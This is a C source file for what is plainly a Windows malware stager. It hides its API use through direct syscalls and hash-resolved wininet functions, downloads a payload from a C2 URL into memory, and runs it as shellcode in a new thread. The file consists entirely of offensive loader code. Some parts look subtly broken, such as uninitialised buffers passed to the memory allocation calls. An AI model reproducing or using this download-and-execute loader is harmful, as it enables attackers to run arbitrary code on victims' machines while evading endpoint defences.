#include "core.h"

void InitUnicodeString(PUNICODE_STRING pUnicodeString, PCWSTR pwszString) {
    if (pwszString) {
        size_t len = wcslen(pwszString);
        pUnicodeString->Length = (USHORT)(len * sizeof(WCHAR));
        pUnicodeString->MaximumLength = pUnicodeString->Length + sizeof(WCHAR);
        pUnicodeString->Buffer = (PWSTR)pwszString;
    } else {
        pUnicodeString->Length = 0;
        pUnicodeString->MaximumLength = 0;
        pUnicodeString->Buffer = NULL;
    }
}

PVOID load_dll_in_mem(PCWSTR dll_path_string) {

    // TODO: make generic using dll_path_string parameter
    
    NTSTATUS status;
    HANDLE hfile;
    HANDLE hsection;
    PVOID pdll = NULL;
    SIZE_T viewSize = 0;
    OBJECT_ATTRIBUTES objattr;
    IO_STATUS_BLOCK iostatus;
    UNICODE_STRING dllpath;

    InitUnicodeString(&dllpath, L"\\??\\C:\\Windows\\System32\\wininet.dll");
    InitializeObjectAttributes(&objattr, &dllpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = Syscall(NT_OPEN_FILE, 6, &hfile, FILE_READ_DATA | SYNCHRONIZE, &objattr, &iostatus, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(status) || !hfile) {
        DEBUG_PRINT("[-] Failed to open DLL file.");
        return NULL;
    }

    status = Syscall(NT_CREATE_SECTION, 7, &hsection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hfile);
    if (!NT_SUCCESS(status) || !hsection) {
        DEBUG_PRINT("[-] Failed to create DLL section.");
        status = Syscall(NT_CLOSE, 1, hfile);
        return NULL;
    }

    status = Syscall(NT_MAP_VIEW_OF_SECTION, 10, hsection, NtCurrentProcess(), &pdll, 0, 0, &viewSize, ViewShare, 0, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(status) || !pdll) {
        DEBUG_PRINT("[-] Failed to map DLL section.");
        status = Syscall(NT_CLOSE, 1, hfile);
        status = Syscall(NT_CLOSE, 1, hsection);
        return NULL;
    }

    status = Syscall(NT_CLOSE, 1, hfile);
    status = Syscall(NT_CLOSE, 1, hsection);

    return pdll;
}

char* download_payload(SIZE_T* payload_size) {

    NTSTATUS status;
    HANDLE hproc;
    SIZE_T buffer_size = 20 * 1024 * 1024;      // 20 MB to hold the payload
    DWORD bytes_read = 0;
    DWORD total_bytes_read = 0;
    char* pbuff;
    PVOID pdll = NULL;

    pdll = load_dll_in_mem(NULL);
    if (!pdll) {
        DEBUG_PRINT("[-] Failed to load DLL in memory.");
        return NULL;
    }

    pInternetOpenA InternetOpenA = (pInternetOpenA)get_api_by_hash((HMODULE)pdll, hash_IntOpen);
    pInternetOpenUrlA InternetOpenUrlA = (pInternetOpenUrlA)get_api_by_hash((HMODULE)pdll, hash_IntOpenUrl);
    pInternetReadFile InternetReadFile = (pInternetReadFile)get_api_by_hash((HMODULE)pdll, hash_IntReadFile);
    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)get_api_by_hash((HMODULE)pdll, hash_IntClose);
    if (!InternetOpenA || !InternetOpenUrlA || !InternetReadFile || !InternetCloseHandle) {
        DEBUG_PRINT("[-] Failed to get one or more required wininet APIs.");
        goto fail;
    }

    status = Syscall(NT_ALLOCATE_VIRTUAL_MEMORY, 6, &hproc, (PVOID)pbuff, NULL, &buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status) || !pbuff || !hproc) {
        DEBUG_PRINT("[-] Failed to allocate virtual memory.");
        goto fail;
    }

    // TODO: connect to C2 server with InternetOpenA and InternetOpenUrlA
    HINTERNET hinternet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hinternet) {
        DEBUG_PRINT("[-] Failed to open internet connection.");
        goto fail;
    }

    HINTERNET hurl = InternetOpenUrlA(hinternet, C2_URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hurl) {
        DEBUG_PRINT("[-] Failed to open URL.");
        InternetCloseHandle(hinternet);
        goto fail;
    }

    // TODO: read payload from C2 server with InternetReadFile
    do {
        if (!InternetReadFile(hurl, pbuff + total_bytes_read, 1024, &bytes_read)) {
            break; // reading error
        }
        total_bytes_read += bytes_read;
    } while (bytes_read > 0);

    InternetCloseHandle(hurl);
    InternetCloseHandle(hinternet);

    if (total_bytes_read == 0) {
        DEBUG_PRINT("[-] Failed to read payload from C2 server.");
        status = Syscall(NT_FREE_VIRTUAL_MEMORY, 4, hproc, (PVOID)pbuff, 0, MEM_RELEASE);
        if (!NT_SUCCESS(status)) {
            DEBUG_PRINT("[-] Failed to free virtual memory.");
        }
        goto fail;
    }

    success:
    *payload_size = total_bytes_read;
    status = Syscall(NT_CLOSE, 1, hproc);
    return pbuff;

    fail:
    status = Syscall(NT_CLOSE, 1, hproc);
    return NULL;

}

BOOL execute_payload(char* payload, SIZE_T payload_size) {

    NTSTATUS status;
    HANDLE hproc;
    HANDLE hthread;
    CLIENT_ID cid;
    OBJECT_ATTRIBUTES oa;
    PVOID pbuff;
    SIZE_T pbytes_written;

    // NOTE: payload is injected in current process
    status = Syscall(NT_OPEN_PROCESS, 4, &hproc, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(status) || !hproc) {
        DEBUG_PRINT("[-] Failed to open process.");
        goto fail;
    }

    status = Syscall(NT_ALLOCATE_VIRTUAL_MEMORY, 6, hproc, pbuff, NULL, &payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status) || !pbuff) {
        DEBUG_PRINT("[-] Failed to allocate virtual memory.");
        goto fail;
    }

    status = Syscall(NT_WRITE_VIRTUAL_MEMORY, 5, hproc, pbuff, payload, payload_size, &pbytes_written);
    if (!NT_SUCCESS(status) || pbytes_written < payload_size) {
        DEBUG_PRINT("[-] Failed to write virtual memory.");
        goto fail;
    }

    status = Syscall(NT_PROTECT_VIRTUAL_MEMORY, 5, hproc, pbuff, &payload_size, PAGE_EXECUTE_READ, NULL);
    if (!NT_SUCCESS(status)) {
        DEBUG_PRINT("[-] Failed to change permissions of virtual memory.");
        goto fail;
    }

    status = Syscall(NT_CREATE_THREAD, 11, &hthread, THREAD_ALL_ACCESS, NULL, hproc, (LPTHREAD_START_ROUTINE)pbuff, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status) || !hthread) {
        DEBUG_PRINT("[-] Failed to create thread.");
        goto fail;
    }

    success:
    status = Syscall(NT_CLOSE, 1, hproc);
    status = Syscall(NT_CLOSE, 1, hthread);
    return TRUE;

    fail:
    status = Syscall(NT_CLOSE, 1, hproc);
    status = Syscall(NT_CLOSE, 1, hthread);
    return FALSE;
    
}